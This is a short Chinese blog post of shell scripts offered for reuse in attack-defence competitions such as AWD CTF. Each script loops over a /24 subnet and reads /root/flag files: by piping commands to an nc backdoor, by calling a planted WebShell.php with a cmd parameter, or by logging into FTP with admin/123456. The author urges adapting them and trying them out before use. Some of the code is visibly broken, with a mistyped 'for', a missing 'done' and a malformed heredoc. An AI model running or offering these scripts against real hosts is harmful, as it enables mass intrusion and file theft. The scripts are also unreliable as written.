        <h1 id="0x00-介绍">0x00 介绍</h1>
<p>我在全国职业技能大赛比赛时所用的shell脚本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc后门:</span><br><span class="line">port=10001 </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">payload=`<span class="built_in">echo</span> <span class="string">"cat /root/flag*.txt;exit"</span> | nc <span class="variable">$ip</span> <span class="variable">$port</span>`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webshell:</span><br><span class="line">or i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">curl http://<span class="variable">$ip</span>/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp:</span><br><span class="line">username=<span class="string">'admin'</span></span><br><span class="line">passwd=<span class="string">'123456'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">sh ftpmain.sh <span class="variable">$ip</span> <span class="variable">$username</span> <span class="variable">$passwd</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配合ftp使用</span></span><br><span class="line">ftpmain:</span><br><span class="line">ftp <span class="variable">$1</span> -inv</span><br><span class="line">user <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">get /root/flag*.txt</span><br><span class="line"><span class="built_in">bye</span></span><br><span class="line">!</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。<br>
尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战<br>
这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛</p>
</blockquote>
